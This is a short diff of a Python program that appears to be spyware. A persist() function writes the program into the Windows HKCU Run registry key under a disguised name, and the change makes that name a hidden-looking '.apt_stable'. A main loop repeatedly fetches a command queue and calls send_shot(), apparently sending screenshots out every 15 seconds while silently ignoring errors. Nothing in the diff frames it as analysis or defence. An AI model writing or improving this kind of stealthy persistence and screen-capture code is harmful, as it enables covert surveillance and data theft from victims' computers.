@@ -58,7 +58,7 @@ def persist():
         key = "HKEY_CURRENT_USER" 
         key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         _open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
-        reg.SetValueEx(_open,"apt_stable",0,reg.REG_SZ,address) 
+        reg.SetValueEx(_open,".apt_stable",0,reg.REG_SZ,address) 
         reg.CloseKey(_open) 
 
 
@@ -220,8 +220,8 @@ add_to_queue()
 persist()
 while True:
     try:
-        sleep(15)
         get_queue()
         send_shot()
     except:
         pass
+    sleep(15)
